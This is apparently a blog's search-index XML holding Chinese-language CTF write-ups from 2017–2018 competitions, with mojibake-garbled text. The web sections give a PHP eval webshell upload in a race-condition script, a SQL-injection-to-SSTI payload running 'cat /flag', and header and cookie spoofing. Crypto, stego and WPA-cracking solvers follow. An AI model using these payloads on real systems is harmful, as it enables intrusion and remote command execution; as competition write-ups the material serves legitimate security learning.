<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>2018å±±ä¸œçœçœèµ›(ç§‘æ¥æ¯)WriteUp</title>
    <url>/2018/11/06/2018-shan-dong-sheng-sheng-sai-ke-lai-bei-writeup/</url>
    <content><![CDATA[<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Web1"><a href="#Web1" class="headerlink" title="Web1"></a>Web1</h3><p>æ ¹æ®æç¤º<code>â€œä½ çš„IPåœ°å€ä¸åœ¨å…è®¸èŒƒå›´å†…â€œ</code>ï¼Œåœ¨è¯·æ±‚å¤´æ·»åŠ <code>X-Forwarded-For:127.0.0.1</code>ï¼Œ</p>
<p>æ ¹æ®æç¤º<code>â€œä½ ä¸æ˜¯ç®¡ç†å‘˜â€</code>ï¼Œä¿®æ”¹cookie<code>admin</code>çš„å€¼ä¸º1ã€‚</p>
<p>å¾—åˆ°flagã€‚</p>
<h3 id="Web2"><a href="#Web2" class="headerlink" title="Web2"></a>Web2</h3><p>ç¬¬ä¸€å…³ç»™å‡ºäº†æºç ï¼Œè€ƒå¯Ÿçš„æ˜¯å˜é‡è¦†ç›–+å¼±ç±»å‹æ¯”è¾ƒ</p>
<pre><code class="php">&lt;?php

    include &#39;here.php&#39;;
    $key = &#39;kelaibei&#39;;

    if(isset($_GET[&#39;id&#39;]))&#123;
        $id = $_GET[&#39;id&#39;];
        @parse_str($id);
        if ($key[99] != &#39;aabg7XSs&#39; &amp;&amp; md5($key[99]) == md5(&#39;aabg7XSs&#39;)) &#123;
           echo $hint;
        &#125;
        else&#123;
            echo &#39;try again&#39;;
        &#125;
    &#125;
    else&#123;
        show_source(__FILE__);
    &#125;</code></pre>
<p>payloadï¼š</p>
<pre><code class="php">/?id=key[99]=314282422</code></pre>
<p>ç¬¬äºŒå…³</p>
<p>æœ‰ä¸€ä¸ªè¡¨å•ï¼Œè¾“å…¥æ–‡ä»¶åå’Œå†…å®¹æ¥åˆ›å»ºæ–‡ä»¶å¹¶è¿”å›è·¯å¾„ã€‚ä½†å½“æˆ‘ä»¬å»è®¿é—®è¿”å›çš„æ–‡ä»¶è·¯å¾„æ—¶ï¼Œå†…å®¹å˜æˆäº†<code>too solw!</code>,èƒ½æ³¨æ„åˆ°submitä¹‹åæœ‰ä¸€ä¸ªçŸ­æš‚çš„åœé¡¿æ—¶é—´æ‰è¿”å›è·¯å¾„ã€‚</p>
<p>å®ƒçš„é€»è¾‘æ˜¯ï¼Œä¸Šä¼ ååˆ›å»ºè¯¥æ–‡ä»¶ï¼Œæœ‰ä¸€ä¸ª1æˆ–2ç§’çš„sleepæ‰è¿”å›è·¯å¾„ï¼Œåœ¨sleepæ‰§è¡Œå®Œåæ‰§è¡Œçš„åº”è¯¥æ˜¯è¦†ç›–è¯¥æ–‡ä»¶å†…å®¹çš„æ“ä½œï¼Œä¹Ÿå°±æ˜¯<code>too slow</code>ï¼Œä¹Ÿå°±æ˜¯è¯´ç­‰æˆ‘ä»¬å‘å‡ºçš„è¯·æ±‚è¿”å›æ—¶ï¼Œæ–‡ä»¶å†…å®¹å·²ç»è¢«è¦†ç›–äº†ã€‚åœ¨è¦†ç›–å‰è®¿é—®åˆ°è¯¥æ–‡ä»¶å°±ä¼šè¿”å›flagï¼Œå¹¶ä¸ç”¨æ‰§è¡Œå‘½ä»¤ã€‚</p>
<p><img src="/images/2018shengsai/web2.png"></p>
<p>è§£é¢˜æ€è·¯æ˜¯ï¼šå†™ä¸ªè„šæœ¬ä¸åœçš„è¯·æ±‚è¯¥æ–‡ä»¶ã€‚</p>
<p>å½“æ—¶çš„è„šæœ¬ï¼š</p>
<pre><code class="python">import requests
import threading
S = requests.session()
burp0_url = &quot;http://47.105.148.65:29002/upl04d50m3thing.php?filename=shell.php&amp;content=%3C%3Fphp+%40eval%28%24_POST%5B%27a%27%5D%29%3B+%3F%3E&quot;
burp0_cookies = &#123;&quot;PHPSESSID&quot;: &quot;9f53c39f9d92b155eef84f566a85af1c&quot;, &quot;session&quot;: &quot;.eJwNj01rg0AQQP9KmbMHs91ehB5Sti6mzIhiCLO3fCzq6NhiG9oY8t_r_T0e7w7Hi_YTZD_zNSbQXyDbJDB9TucI2R2eTpABamXJtTduimeU_UKyNehroWX7ywZv5KoXlrcOpfgjX6VBWkOH3RD8fkHXWlIa-ZCPvKz-cjastZIbhSQXMkWKknfcBCUZLAnb0u-UZTClo5FcLaXPO9R6QGk32NQS_HvKioZ0bUi1coNlE_rg8RUeCVy_4zwddR2Aptf4EeNXnOHxDwKRTN0.DsLJEg.b1wYSUwY1h1HFFHsrhU-6zGDaCE&quot;, &quot;admin&quot;: &quot;0&quot;&#125;
burp0_headers = &#123;&quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8&quot;, &quot;Referer&quot;: &quot;http://47.105.148.65:29002/upl04d50m3thing.php?filename=shell.php&amp;content=aa&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9&quot;, &quot;Connection&quot;: &quot;close&quot;&#125;
def up():
    burp0_url = &quot;http://47.105.148.65:29002/upl04d50m3thing.php?filename=shell.php&amp;content=%3C%3Fphp+%40eval%28%24_POST%5B%27a%27%5D%29%3B+%3F%3E&quot;
    a=S.get(burp0_url,headers=burp0_headers, cookies=burp0_cookies)

def shell():
            url2=&quot;http://47.105.148.65:29002/uploads/8af92ffefda7050707590b352dfb3cd2e03d29a6/shell.php&quot;
    data=&#123;&#39;a&#39;:&#39;system(\&#39;pwd\&#39;);&#39;&#125;
    b=S.get(url2,headers=burp0_headers, cookies=burp0_cookies,data=data)
    print b.text

for i in range(10):
    a = threading.Thread(target=up)
    b = threading.Thread(target=shell)
    a.start()
    b.start()

for i in range(10):
    a.join()
    b.join()</code></pre>
<p>å½“æ—¶ä»¥ä¸ºè¦ä¼ shellæ‰§è¡Œå‘½ä»¤æ¥ç€ã€‚å…¶å®å¯ä»¥æ›´ç®€å•çš„è„šæœ¬ï¼Œå¾ªç¯è¯·æ±‚è¯¥æ–‡ä»¶ï¼Œæ‰‹åŠ¨submitå°±okäº†ã€‚</p>
<pre><code class="python">import requests
def up():
    url = &quot;http://47.105.148.65:29002/uploads/635e1c31153cc410cb61e8997f7c0458fb72785f/shell.php&quot;
    a=requests.get(burp0_url)
    print a.text
while(True):
    up()
###webé¡µé¢æ‰‹åŠ¨æäº¤å°±ok</code></pre>
<h3 id="Web3"><a href="#Web3" class="headerlink" title="Web3"></a>Web3</h3><p>searchå¤„å­˜åœ¨æ³¨å…¥ï¼Œä½†flagä¸åœ¨æ•°æ®åº“ä¸­ï¼Œå› ä¸ºæŸ¥è¯¢çš„ç»“æœåœ¨æ¸²æŸ“æ—¶æ²¡å¤„ç†ç›´æ¥è¿›è¡Œæ¸²æŸ“æ‰€ä»¥è¿™é‡Œå­˜åœ¨sstiã€‚</p>
<p>æ‰€ä»¥è¿™æ˜¯ä¸ªæ³¨å…¥å’Œsstiçš„é¢˜ç›®ï¼Œé€šè¿‡union selectæ§åˆ¶æŸ¥è¯¢ç»“æœå®ç°sstiã€‚</p>
<pre><code class="php">http://47.105.148.65:29003/?username=%27union+select+1,%22&#123;&#123;config&#125;&#125;,3%20%23</code></pre>
<p><img src="/images/2018shengsai/web3-1.png"></p>
<p>æ²¡ä»€ä¹ˆè¿‡æ»¤çš„ï¼Œæ‰§è¡Œå‘½ä»¤è¾“å‡ºflagã€‚</p>
<pre><code class="php">http://47.105.148.65:29003/?username=%27union+select+1,%22&#123;&#123;().__class__.__mro__[1].__subclasses__()[59].__init__.func_globals.linecache.os.popen('cat /flag').read()&#125;&#125;%22,3%20%23</code></pre>
<p><img src="/images/2018shengsai/web3-1.png"></p>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="è¿›åˆ¶è½¬æ¢"><a href="#è¿›åˆ¶è½¬æ¢" class="headerlink" title="è¿›åˆ¶è½¬æ¢"></a>è¿›åˆ¶è½¬æ¢</h3><blockquote>
<p>äºŒè¿›åˆ¶ã€å…«è¿›åˆ¶ã€åè¿›åˆ¶ã€åå…­è¿›åˆ¶ï¼Œä½ èƒ½åˆ†çš„æ¸…å—ï¼Ÿ</p>
</blockquote>
<p>é™„ä»¶ï¼š</p>
<pre><code>d87 x65 x6c x63 o157 d109 o145 b100000 d116 b1101111 o40 x6b b1100101 b1101100 o141 d105 x62 d101 b1101001 d46 o40 d71 x69 d118 x65 x20 b1111001 o157 b1110101 d32 o141 d32 d102 o154 x61 x67 b100000 o141 d115 b100000 b1100001 d32 x67 o151 x66 d116 b101110 b100000 d32 d102 d108 d97 o147 d123 x31 b1100101 b110100 d98 d102 b111000 d49 b1100001 d54 b110011 x39 o64 o144 o145 d53 x61 b1100010 b1100011 o60 d48 o65 b1100001 x63 b110110 d101 o63 b111001 d97 d51 o70 d55 b1100010 d125 x20 b101110 x20 b1001000 d97 d118 o145 x20 d97 o40 d103 d111 d111 x64 d32 o164 b1101001 x6d o145 x7e</code></pre>
<p>å†™è„šæœ¬åŒ¹é…ä¸€ä¸‹å°±okï¼š</p>
<pre><code class="python">import re
s=&quot;d87 x65 x6c x63 o157 d109 o145 b100000 d116 b1101111 o40 x6b b1100101 b1101100 o141 d105 x62 d101 b1101001 d46 o40 d71 x69 d118 x65 x20 b1111001 o157 b1110101 d32 o141 d32 d102 o154 x61 x67 b100000 o141 d115 b100000 b1100001 d32 x67 o151 x66 d116 b101110 b100000 d32 d102 d108 d97 o147 d123 x31 b1100101 b110100 d98 d102 b111000 d49 b1100001 d54 b110011 x39 o64 o144 o145 d53 x61 b1100010 b1100011 o60 d48 o65 b1100001 x63 b110110 d101 o63 b111001 d97 d51 o70 d55 b1100010 d125 x20 b101110 x20 b1001000 d97 d118 o145 x20 d97 o40 d103 d111 d111 x64 d32 o164 b1101001 x6d o145 x7e&quot;
s = s.split(&quot; &quot;)
slen = len(s)
for i in range(slen):
    if re.match(&quot;d()&quot;,s[i]):
        s[i] = s[i][1:]
    elif re.match(&quot;x()&quot;,s[i]):
        s[i] = int(s[i][1:],16)
    elif re.match(&quot;o()&quot;,s[i]):
        s[i] = int(s[i][1:],8)
    elif re.match(&quot;b()&quot;,s[i]):
        s[i] = int(s[i][1:],2)

flag = &#39;&#39;
for i in range(slen):
    flag += chr(int(s[i]))
print flag</code></pre>
<h3 id="crack-it"><a href="#crack-it" class="headerlink" title="crack it"></a>crack it</h3><pre><code>flag:hellokitty</code></pre>
<p><img src="/images/2018shengsai/crackit.png"></p>
<h3 id="basic"><a href="#basic" class="headerlink" title="basic"></a>basic</h3><p>ç»˜å›¾ï¼Œç»™äº†å…±135000è¡Œrgbå€¼ï¼Œé•¿å®½çš„è¯çˆ†ç ´ä¸€ä¸‹135000çš„å› å­å°±æœ‰äº†ã€‚</p>
<pre><code class="python">#-*- coding:utf-8-*-

from PIL import Image

file = open(&#39;basic.txt&#39;, &#39;r&#39;)

x = 75    #å› å¼åˆ†è§£135000
y = 1800

IM = Image.new(&quot;RGB&quot;, (x, y))

for i in range(x):
    for j in range(y):
        line = file.readline()
        e = line.strip().lstrip(&#39;(&#39;).rstrip(&#39;)&#39;) #å»é™¤å·¦å³æ‹¬å·
        tmp = e.split(&#39;,&#39;)
        #print tmp
        IM.putpixel((i, j), (int(tmp[0]), int(tmp[1]), int(tmp[2])))

IM.show(&#39;pic.png&#39;) #å­˜å‚¨å›¾ç‰‡ä¸ºpic</code></pre>
<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h3><p>Wiener-attack</p>
<p>Ctf-rsa-tools    ä¸€æŠŠæ¢­</p>
<pre><code>N : 460657813884289609896372056585544172485318117026246263899744329237492701820627219556007788200590119136173895989001382151536006853823326382892363143604314518686388786002989248800814861248595075326277099645338694977097459168530898776007293695728101976069423971696524237755227187061418202849911479124793990722597
e : 354611102441307572056572181827925899198345350228753730931089393275463916544456626894245415096107834465778409532373187125318554614722599301791528916212839368121066035541008808261534500586023652767712271625785204280964688004680328300124849680477105302519377370092578107827116821391826210972320377614967547827619

enc : 38230991316229399651823567590692301060044620412191737764632384680546256228451518238842965221394711848337832459443844446889468362154188214840736744657885858943810177675871991111466653158257191139605699916347308294995664530280816850482740530602254559123759121106338359220242637775919026933563326069449424391192</code></pre>
<p><img src="/images/2018shengsai/rsa.png"></p>
<h3 id="affine"><a href="#affine" class="headerlink" title="affine"></a>affine</h3><blockquote>
<p>y = 17*x-8 </p>
<p>flag{szzyfimhyzd}</p>
</blockquote>
<p>ä»¿å°„åŠ å¯†</p>
<pre><code class="python">def affine(a, b):
    pwd = &#123;&#125;
    for i in range(26):
        pwd_dic[chr(((a*i+b)%26+97))] = chr(i+97)
    return pwd_dic

if __name__ == &#39;__main__&#39;:
    pwd_dic = &#123;&#125;
    pwd = &#39;szzyfimhyzd&#39;
    plain = []
    pwd_dic = affine(17, -8)
    #print pwd_dic
    for i in pwd:
        plain.append(pwd_dic[i])
    print &quot;Flag is : &quot; + &quot;&quot;.join(plain)
</code></pre>
<h3 id="ç¥ç§˜çš„ä»£ç "><a href="#ç¥ç§˜çš„ä»£ç " class="headerlink" title="ç¥ç§˜çš„ä»£ç "></a>ç¥ç§˜çš„ä»£ç </h3><p>xor+aes_ecb</p>
<p>å…ˆå¼‚æˆ–ä¸¤ä¸ªinfoæ–‡ä»¶</p>
<pre><code class="python">file1 = file(&#39;info_clear.txt&#39;,&#39;rb&#39;)
file2 = file(&#39;info_crypt.txt&#39;,&#39;rb&#39;)
f1 = file1.read()
f2 = file2.read()
out=&#39;&#39;
for i in range(len(f1)):
    out += chr(ord(f1[i])^ord(f2[i]))
print out
file1.close()
file2.close()</code></pre>
<p>å¾—åˆ°å¦‚ä¸‹ä¿¡æ¯ï¼š</p>
<pre><code>i am a hydre agenT, coverly spying on the superHeroes. I am aware of the group that iS going to aTtack you...but Hydra has had its diffErences with you in the past, so i&#39;m not going to maKe it vEry simple for You ....ecb...aes(I Vouch for this: 12345)...md5(this)...base64...</code></pre>
<p>å°†å¤§å†™å­—æ¯æå–å‡ºæ¥ï¼Œæ˜¯<code>THISTHEKEYIV</code>.ä½†è¿™å¹¶ä¸æ˜¯aesçš„keyï¼Œkeyå€¼æ˜¯æ•´æ®µè¯çš„md5ã€‚ï¼ˆemmmmï¼‰</p>
<pre><code class="python">import hashlib
import base64
from Crypto.Cipher import AES

file1 = file(&#39;info_clear.txt&#39;,&#39;rb&#39;)
file2 = file(&#39;info_crypt.txt&#39;,&#39;rb&#39;)
file3 = file(&#39;true_crypto.txt&#39;,&#39;rb&#39;)
f1 = file1.read()
f2 = file2.read()
f3 = base64.b64decode(file3.read())

out=&#39;&#39;
for i in range(len(f1)):
    out += chr(ord(f1[i])^ord(f2[i]))
key = hashlib.md5(out.rstrip(&#39;\n&#39;)).hexdigest()
cipher = AES.new(key, AES.MODE_ECB)
flag = cipher.decrypt(f3)
print flag

file1.close()
file2.close()
file3.close()

#Congratulations, you got the real flag, the flag is - flag&#123;4eS_3Cb_Us3_mD5_key&#125;! :)</code></pre>
<h2 id="Stego"><a href="#Stego" class="headerlink" title="Stego"></a>Stego</h2><h3 id="å•Šå“’"><a href="#å•Šå“’" class="headerlink" title="å•Šå“’"></a>å•Šå“’</h3><p>binwalkåˆ†ç¦»å‡ºä¸ªå‹ç¼©åŒ…</p>
<p>exifä¿¡æ¯æ˜¯ä¸€ä¸²åå…­è¿›åˆ¶ï¼Œè½¬æˆå­—ç¬¦ä¸²æ˜¯å‹ç¼©åŒ…å¯†ç </p>
<p>è§£å‹å¾—åˆ°flag</p>
<h3 id="ç¥ç§˜çš„æ–‡ä»¶"><a href="#ç¥ç§˜çš„æ–‡ä»¶" class="headerlink" title="ç¥ç§˜çš„æ–‡ä»¶"></a>ç¥ç§˜çš„æ–‡ä»¶</h3><p>æ˜æ–‡æ”»å‡»</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>WriteUp</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>Bugkuçš„CTFéƒ¨åˆ†WP</title>
    <url>/2017/07/12/bugku-de-ctf-bu-fen-wp/</url>
    <content><![CDATA[<h1 id="Bugku-CTFéƒ¨åˆ†WP"><a href="#Bugku-CTFéƒ¨åˆ†WP" class="headerlink" title="Bugku-CTFéƒ¨åˆ†WP"></a>Bugku-CTFéƒ¨åˆ†WP</h1><h3 id="éšå†™2"><a href="#éšå†™2" class="headerlink" title="éšå†™2"></a>éšå†™2</h3><p>é€šè¿‡pngæ”¹é«˜åº¦éšè—flagã€‚</p>
<p>å…ˆæ¥äº†è§£ä¸€ä¸‹pngçš„å¤´æ–‡ä»¶ã€‚</p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170712/103156061.png" alt="mark"></p>
<p><code>89 50 4E 47 0D 0A 1A 0A </code>  â€”â€”&gt;PNGå¤´éƒ¨ç½²ååŸŸï¼Œè¡¨ç¤ºè¿™æ˜¯ä¸€ä¸ªPNGå›¾ç‰‡</p>
<p><code>00 00 00 0D </code>                         â€”â€”-&gt;æè¿°IHDRå¤´éƒ¨çš„å¤§å°</p>
<p><code>49 48 44 52</code>                         â€”â€”&gt;æ˜¯Chunk Type Code, è¿™é‡ŒChunk Type Code=IHDR</p>
<p><code>F9 7D AA 93</code>                         â€”â€”&gt;å¯¹IHDRçš„CRCæ ¡éªŒ</p>
<p><code>00 00 01 F4</code>                         â€”â€”&gt;å›¾åƒå®½åº¦ï¼Œ500åƒç´ </p>
<p><code>00 00 01 A4</code>                         â€”â€”&gt;å›¾åƒé«˜åº¦ã€‚</p>
<p>æœ¬æ¥å›¾åƒé«˜åº¦æ˜¯420,æ”¹æˆ500å°±å‡ºæ¥flagäº†ã€‚</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>WriteUp</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>CISCN2018 WriteUp</title>
    <url>/2018/04/29/ciscn2018-wp/</url>
    <content><![CDATA[<h2 id="From-ä¸€ä¸ªæ›´å“äº®çš„é˜Ÿå"><a href="#From-ä¸€ä¸ªæ›´å“äº®çš„é˜Ÿå" class="headerlink" title="From ä¸€ä¸ªæ›´å“äº®çš„é˜Ÿå"></a>From ä¸€ä¸ªæ›´å“äº®çš„é˜Ÿå</h2><a id="more"></a>



<h2 id="Web1"><a href="#Web1" class="headerlink" title="Web1"></a>Web1</h2><p>ç™»é™†æ—¶ç”¨æˆ·åä¸ºadminï¼Œå¯†ç ç½®ç©ºï¼Œç™»é™†è¿›å»æ‹¿åˆ°flagã€‚</p>
<p><img src="/images/ciscn2018/web1.png" alt="web1"></p>
<h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="flag-in-your-hand"><a href="#flag-in-your-hand" class="headerlink" title="flag_in_your_hand"></a>flag_in_your_hand</h3><pre><code class="python">a = [118, 104, 102, 120, 117, 108, 119, 124, 48,123,101,121]
flag=&#39;&#39;
for i in range(len(a)):
    flag += chr(a[i]-3)

print flag 
#security-xbv</code></pre>
<p><img src="/images/ciscn2018/flag-in-u-hand.png" alt="flag-in-u-hand"></p>
<h3 id="SM"><a href="#SM" class="headerlink" title="SM"></a>SM</h3><pre><code class="python">from Crypto.Util.number import getPrime,long_to_bytes,bytes_to_long
from Crypto.Cipher import AES
import hashlib
import base64

f = open(&#39;ps&#39;).read()
ps = f.split(&quot;\r\n&quot;)
for i in range(len(ps)):
    ps[i] = bin(int(ps[i]))[2:]        


r = 6753785483255906709117615805253027649453460653974415214642466102672301763943358839905575042938258141827000621474498066533397472809407687579125519939754658
ef = &#39;5eFo3ANg2fu9LRrFktWCJmVvx6RgBFzd0R8GXQ8JD78==&#39;
br = bin(r)[2:]

ok = []
#print len(br),len(ps)
for i in range(511,-1,-1):    #len(br)-1 -- 0
    for j in range(512):        #512
        if ps[j][i] == &#39;1&#39; and &#39;1&#39; not in ps[j][i+1:]:
            mark = 0
            for k in ok:
                mark ^= int(ps[k][i])
            if mark ^ int(br[i]) == 1:
                ok.append(j)
                break

bchoose = &#39;&#39;
for i in range(512):
    if i in ok:
        bchoose += &#39;1&#39;
    else:
        bchoose += &#39;0&#39;

choose = int(bchoose,2)

key=long_to_bytes(int(hashlib.md5(long_to_bytes(choose)).hexdigest(),16))
aes_obj = AES.new(key, AES.MODE_ECB)
print aes_obj.decrypt(base64.b64decode(ef))
#flag&#123;shemir_alotof_in_wctf_fun!&#125;
</code></pre>
<p><img src="/images/ciscn2018/sm.png" alt="sm"></p>
<h3 id="interesting"><a href="#interesting" class="headerlink" title="interesting"></a>interesting</h3><pre><code class="python">import hashlib
from Crypto.Util.number import getPrime, long_to_bytes, bytes_to_long
from Crypto.Cipher import AES
import random
import base64
def gen_iv(seed):
    s=random.Random()
    s.seed(seed)
    while True:
        iv=long_to_bytes(s.randint(0xfffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff))
        if hashlib.sha256(iv).hexdigest()[0:4]==hashlib.sha256(long_to_bytes(seed)).hexdigest()[0:4]:
            return iv
def gen_password(seed):
    s=random.Random()
    s.seed(seed)
    while True:
        password=long_to_bytes(s.randint(0xfffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff))
        if hashlib.sha256(password).hexdigest()[4:8]==hashlib.sha256(long_to_bytes(seed)).hexdigest()[4:8]:
            return password
m=&quot;token=5t43g5g2j1;admin=0;group=0&quot;
c=&quot;bMPWOsg+YH0eSwchPY6HTEvf3ESETSrEQ3/M1d0lUm0=&quot;.decode(&quot;base64&quot;)
evil_c=c[:23]+c[23]
new_c=c[:7]+chr(ord(c[7])^ord(&#39;0&#39;)^ord(&#39;1&#39;))+c[8:]
new_c2=c[:15]+chr(ord(c[15])^ord(&#39;0&#39;)^ord(&#39;1&#39;))+c[16:]
new_c3=c[:7]+chr(ord(c[7])^ord(&#39;0&#39;)^ord(&#39;1&#39;))+c[8:15]+chr(ord(c[15])^ord(&#39;0&#39;)^ord(&#39;1&#39;))+c[16:]
monster=new_c3
seed=int(hashlib.sha256(monster).hexdigest(),16)
iv=gen_iv(seed)
password=gen_password(seed)
cipher = AES.new(password, AES.MODE_CBC, iv)
msg=open(&#39;heheda.txt&#39;,&#39;rb&#39;).read().decode(&#39;hex&#39;)
c = cipher.decrypt(msg)
#print c
while c[-1]==&#39;A&#39;:
    c=c[:-1]
c=int(c,10)
#print hex(c)[2:-1].decode(&#39;hex&#39;)
d=hex(c)[2:-1].decode(&#39;hex&#39;)
d=base64.b64decode(d)
d=base64.b32decode(d)
d=base64.b32decode(d)
d=base64.b64decode(d)
d=d.decode(&#39;hex&#39;)
d=base64.b32decode(d)
d=base64.b64decode(d)
d=base64.b32decode(d)
d=base64.b64decode(d)
d=d.decode(&#39;hex&#39;)
d=d.decode(&#39;hex&#39;)
d=d.decode(&#39;hex&#39;)
d=base64.b64decode(d)
d=d.decode(&#39;hex&#39;)
d=d.decode(&#39;hex&#39;)
print d
#</code></pre>
<p><img src="/images/ciscn2018/interesting.png" alt="interesting"></p>
<h3 id="oldstreamgame"><a href="#oldstreamgame" class="headerlink" title="oldstreamgame"></a>oldstreamgame</h3><p>çˆ†ç ´ï¼Œè·‘äº†4ä¸ªå¤šå°æ—¶â€¦..</p>
<pre><code class="python">import base64

def lfsr(R,mask):
    output = (R &lt;&lt; 1) &amp; 0xffffffff
    i=(R&amp;mask)&amp;0xffffffff
    lastbit=0
    while i!=0:
        lastbit^=(i&amp;1)
        i=i&gt;&gt;1
    output^=lastbit
    return (output,lastbit)
mask = 0b10100100000010000000100010010100
         #10010010011000100000000111010111
key = [32, 253, 238, 248, 164, 201, 244, 8, 63, 51, 29, 168, 35, 138, 229, 237, 8, 61, 240, 203, 14, 122, 131, 53, 86, 150, 52, 93, 244, 77, 124, 24, 108, 31, 69, 155, 206, 19, 95, 29, 182, 199, 103, 117, 213, 220, 186, 183, 167, 131, 228, 138, 32, 60, 25, 202, 37, 194, 47, 96, 174, 98, 179, 125, 232, 228, 5, 120, 227, 167, 120, 126, 180, 41, 115, 13, 149, 201, 225, 148, 66, 136, 235, 62, 46, 116, 125, 130, 22, 164, 120, 85, 7, 161, 55, 180, 19, 205, 105, 12]
a = 0
for R in range(pow(2,31),pow(2,32)):
    flag = True
    r = R
    print(a)
    a += 1
    for i in range(100):
        tmp = 0
        for j in range(8):
            (R, out) = lfsr(R, mask)
            tmp = (tmp &lt;&lt; 1) ^ out
        if tmp != key[i]:
            flag = False
            break
    if flag:
        print(&quot;flag&#123;&quot; + bin(r)[2:] + &quot;&#125;&quot;)
        break</code></pre>
<p><img src="/images/ciscn2018/old.jpg" alt="old"></p>
<p><img src="/images/ciscn2018/old2.png" alt="old2"></p>
<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="éªŒè¯ç ï¼ˆç­¾åˆ°ç‰ˆï¼‰"><a href="#éªŒè¯ç ï¼ˆç­¾åˆ°ç‰ˆï¼‰" class="headerlink" title="éªŒè¯ç ï¼ˆç­¾åˆ°ç‰ˆï¼‰"></a>éªŒè¯ç ï¼ˆç­¾åˆ°ç‰ˆï¼‰</h3><p>è¾“å…¥éªŒè¯ç ï¼Œå¾—åˆ°flag</p>
<h3 id="Picture"><a href="#Picture" class="headerlink" title="Picture"></a>Picture</h3><p>binwalkåˆ†ç¦»å‡ºæ–‡æœ¬æ–‡ä»¶ï¼š97E4ï¼Œå†…å®¹ä¸ºbase64ç¼–ç åçš„ï¼Œå°†å…¶è§£ç åå­˜ä¸ºæ–°æ–‡ä»¶ã€‚å› ä¸ºæ˜¯ä¸ªæ¯”è¾ƒæ˜æ˜¾çš„å‹ç¼©æ–‡ä»¶ï¼Œå‰ä¸¤ä½é”™ä½äº†ï¼Œæ‰‹åŠ¨ä¿®æ­£åå¯ä»¥æ­£å¸¸æ‰“å¼€ï¼Œé‡Œé¢æœ‰ä¸ªcodeæ–‡ä»¶ï¼Œæœ‰å¯†ç ï¼Œæ³¨é‡Šé‡Œæç¤ºäº†å¯†ç ä¸ºæŠ¥é”™ä¸­çš„å†…å®¹ï¼Œæœç´¢å¾—çŸ¥å¯†ç åº”ä¸ºinteger division or modulo by zero,è§£å‹å¾—åˆ°codeæ–‡ä»¶ï¼Œæ ¹æ®æ ¼å¼ç”¨uudecodeè§£å‡ºkey.txt.å¾—åˆ°falgã€‚CISCN{5210A198A4253FF2541833665AC5B94F}</p>
<p>97E4:</p>
<pre><code>S1ADBBQAAQAAAE0wl0ynPOJhWgAAAE4AAAAEAAAAY29kZVmbl9yAjdBdFP/dG/1FDP0ukDBQb9qt5LUn+UsSEd/ECCvK7A+5WyGaWgHSYOFaqK+qP9IU8r6FD+mL7KSlds3nqn0vd9NSsAlWGzsr2YkBhjk1mMfglGM3plBLAQI/ABQAAQAAAE0wl0ynPOJhWgAAAE4AAAAEACQAAAAAAAAAIAAAAAAAAABjb2RlCgAgAAAAAAABABgAAIU4mYXa0wHiHQeth9rTAeIdB62H2tMBUEsFBgAAAAABAAEAVgAAAHwAAADcAFtQeXRob24gMi43XQ0KPj4+IKh9qH2ofQ0KDQpUcmFjZWJhY2sgKG1vc3QgcmVjZW50IGNhbGwgbGFzdCk6DQogIEZpbGUgIjxweXNoZWxsIzA+IiwgbGluZSAxLCBpbiA8bW9kdWxlPg0KICAgIKh9qH2ofQ0KWmVyb0RpdmlzaW9uRXJyb3I6IKh9qH2ofah9qH2ofah9qH2ofah9qH2ofah9qH2ofah9qH2ofah9qH2ofah9qH2ofah9qH2ofah9qH2ofSA8LSBwYXNzd29yZCA7KQ0KPj4+IAA=</code></pre>
<h3 id="å¯»æ‰¾å…¥ä¾µè€…"><a href="#å¯»æ‰¾å…¥ä¾µè€…" class="headerlink" title="å¯»æ‰¾å…¥ä¾µè€…"></a>å¯»æ‰¾å…¥ä¾µè€…</h3><p>å°†attack.pcapngå¯¼å‡ºä¸ºtxtï¼Œåˆ—å‡ºå…¨éƒ¨ç½‘å¡åœ°å€ã€‚</p>
<pre><code class="python">import re

file = open(&#39;attack.txt&#39;,&#39;r&#39;)
data = file.read()

result = re.findall(&#39;\w*:\w*:\w*:\w*:\w*:\w*&#39;,data)

#for i in range(len(result)):
dicdata = set(result)

file.close()

dic = open(&#39;dic.txt&#39;,&#39;w&#39;)

for i in dicdata:
    dic.write(i+&quot;\n&quot;)

dic.close()</code></pre>
<p>ç”¨aircrack-ngçˆ†ç ´hanshake.cap,å¾—åˆ°å¯†ç ä¸º88:25:93:c1:c8:eb,ç”¨airdecap-ngè§£åŒ…ååˆ†æhttpæµå‘ç°äº†â€œwiattack.net/HR2D1k5cVc/key.rarâ€,å»è®¿é—®å¾—åˆ°key.raræ–‡ä»¶ï¼Œè§£å‹å¾—åˆ°key.pcapï¼Œç›´æ¥ç”¨å‘½ä»¤åˆ—å­—ç¬¦ä¸²ã€‚</p>
<p><code>strings key.pcap</code>,åœ¨æœ€åä¸€è¡Œçš„å­—ç¬¦ä¸²å³æ˜¯flagã€‚</p>
<p><img src="/images/ciscn2018/ruqinzhe.png" alt="ruqinzhe"></p>
<p><img src="/images/ciscn2018/rqz2.png" alt="rqz2"></p>
